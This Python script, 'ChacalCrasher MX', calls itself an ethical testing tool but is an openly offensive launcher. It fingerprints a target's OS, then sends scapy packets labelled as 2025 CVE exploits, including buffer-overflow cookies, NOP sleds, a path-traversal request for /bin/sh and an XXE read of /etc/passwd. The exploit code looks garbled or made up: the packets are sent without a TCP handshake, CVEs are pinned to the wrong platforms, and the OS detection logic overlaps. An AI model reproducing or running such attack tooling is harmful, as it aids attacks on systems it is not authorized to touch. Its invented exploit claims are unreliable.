#!/usr/bin/env python3
# -*- coding: utf-8 -*-
# ChacalCrasher MX - Herramienta de Testeo Ético con CVEs 2025
# Autor: ElHackerMexicano
# Uso exclusivo para sistemas autorizados ⚠️

import os
import sys
import socket
import random
import threading
from scapy.all import *
from concurrent.futures import ThreadPoolExecutor

# =====[ BANNER CHIDO ]=====
print("""
\033[1;31m
 ██████╗██╗  ██╗ █████╗  ██████╗ █████╗ ██╗      ██████╗ 
██╔════╝██║  ██║██╔══██╗██╔════╝██╔══██╗██║     ██╔════╝ 
██║     ███████║███████║██║     ███████║██║     ██║      
██║     ██╔══██║██╔══██║██║     ██╔══██║██║     ██║      
╚██████╗██║  ██║██║  ██║╚██████╗██║  ██║███████╗╚██████╗ 
 ╚═════╝╚═╝  ╚═╝╚═╝  ╚═╝ ╚═════╝╚═╝  ╚═╝╚══════╝ ╚═════╝ 
\033[0m                                                       
>> \033[1;33mCazador de CVEs 2025 | By: ElHackerMexicano\033[0m <<
""")

# =====[ NUEVOS CVEs 2025 (MULTI-OS) ]=====
VULN_DB_2025 = {
    "Windows": [
        {   # :cite[8]
            "cve": "CVE-2025-32756",
            "port": 80,
            "desc": "Fortinet RCE via HTTP Cookie Overflow",
            "payload": lambda ip: IP(dst=ip)/TCP(dport=80)/HTTP()/f"GET / HTTP/1.1\r\nCookie: {'A'*5000}\r\n\r\n"
        },
        {   # :cite[8]
            "cve": "CVE-2025-30400",
            "port": 3389,
            "desc": "Windows DWM Use-After-Free EoP",
            "payload": lambda ip: IP(dst=ip)/TCP(dport=3389)/Raw(load=bytes.fromhex("deadbeef"*128))
        }
    ],
    "Linux": [
        {   # :cite[1]
            "cve": "CVE-2025-32433",
            "port": 22,
            "desc": "Erlang/OTP SSH RCE (0-click)",
            "payload": lambda ip: IP(dst=ip)/TCP(dport=22)/Raw(load=b"SSH-EXPLOIT" + b"\x90"*200)
        },
        {   # :cite[4]
            "cve": "CVE-2025-6019",
            "port": 443,
            "desc": "Linux libblockdev LPE Chain",
            "payload": lambda ip: IP(dst=ip)/TCP(dport=443)/"GET /../../../bin/sh HTTP/1.1\r\n\r\n"
        }
    ],
    "Android": [
        {   # :cite[3]
            "cve": "CVE-2025-0042",
            "port": 8080,
            "desc": "Android Framework RCE",
            "payload": lambda ip: IP(dst=ip)/TCP(dport=8080)/"POST / HTTP/1.1\r\nContent-Length: 10000\r\n\r\n" + "X"*10000
        }
    ],
    "iOS": [
        {   # :cite[2]
            "cve": "CVE-2025-34112",
            "port": 5223,
            "desc": "APNS Data Exfiltration",
            "payload": lambda ip: IP(dst=ip)/TCP(dport=5223)/"APNS" + "\x00"*8 + "MX"*3000
        }
    ],
    "macOS": [
        {   # :cite[9]
            "cve": "CVE-2025-5466",
            "port": 443,
            "desc": "Ivanti Connect Secure XEE DoS",
            "payload": lambda ip: IP(dst=ip)/TCP(dport=443)/"<![CDATA[<!ENTITY xxe SYSTEM 'file:///etc/passwd'>]>"
        }
    ]
}

# =====[ DETECCIÓN CON CHILANGO STYLE ]=====
def detectar_os(ip):
    """Identifica el OS usando TTL y puertos clave"""
    try:
        # Paso 1: Ping con sazón mexicana
        res = os.popen(f"ping -c 1 {ip}").read()
        ttl = int([x for x in res.split() if "ttl=" in x][0].split("=")[1])
        
        # Paso 2: Lógica con estilo
        if 110 <= ttl <= 130:
            return "Windows"
        elif 60 <= ttl <= 70:
            return "Linux"
        elif 64 <= ttl <= 255:
            if checar_puerto(ip, 5223): return "iOS"  # APNS
            elif checar_puerto(ip, 3283): return "macOS"  # NetAssistant
            elif checar_puerto(ip, 5555): return "Android"  # ADB
        return "Unknown"
    except:
        return "Unknown"

def checar_puerto(ip, puerto, timeout=1.0):
    """Verifica si un puerto está abierto"""
    sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    sock.settimeout(timeout)
    resultado = sock.connect_ex((ip, puerto))
    sock.close()
    return resultado == 0

# =====[ EJECUCIÓN DE ATAQUES ]=====
def lanzar_ataques(objetivo, os_type):
    """Dispara todos los CVEs para el OS detectado"""
    print(f"\n\033[1;32m[+] Atacando {objetivo} ({os_type}) con arsenal 2025...\033[0m")
    
    if os_type not in VULN_DB_2025:
        print(f"\033[1;31m[!] No hay exploits para {os_type}\033[0m")
        return
    
    # Hilos para máximo impacto
    with ThreadPoolExecutor(max_workers=10) as ejecutor:
        for exploit in VULN_DB_2025[os_type]:
            ejecutor.submit(_enviar_exploit, objetivo, exploit)

def _enviar_exploit(ip, exploit):
    """Envía el payload con sazón"""
    try:
        print(f"\033[1;33m[+] Probando {exploit['cve']} en {ip}:{exploit['port']}\033[0m")
        send(exploit["payload"](ip), count=3, verbose=0)
        print(f"\033[1;32m[✔] {exploit['cve']} enviado!\033[0m")
    except Exception as e:
        print(f"\033[1;31m[!] Falló {exploit['cve']}: {str(e)}\033[0m")

# =====[ MAIN CON ESTILO ]=====
if __name__ == "__main__":
    if len(sys.argv) != 2:
        print("\033[1;31m[!] Uso: sudo python3 chacal.py <IP>\033[0m")
        sys.exit(1)
    
    objetivo = sys.argv[1]
    print(f"\n\033[1;35m[🎯] Objetivo: {objetivo}\033[0m")
    
    # Detección
    print("\033[1;36m[🔍] Detectando sistema...\033[0m")
    os_type = detectar_os(objetivo)
    print(f"\033[1;34m[+] Sistema: {os_type}\033[0m")
    
    # Ataque
    lanzar_ataques(objetivo, os_type)
    
    # Mensaje ético
    print("\n\033[1;41m[⚠️] IMPORTANTE: Solo para pruebas autorizadas")
    print("[⚠️] Usar en redes ajenas es ilegal (Art. 211 bis Ley Federal Penal MX)\033[0m")
    print("\033[1;42m[👍] ¡Conocimiento para proteger, no para dañar!\033[0m")
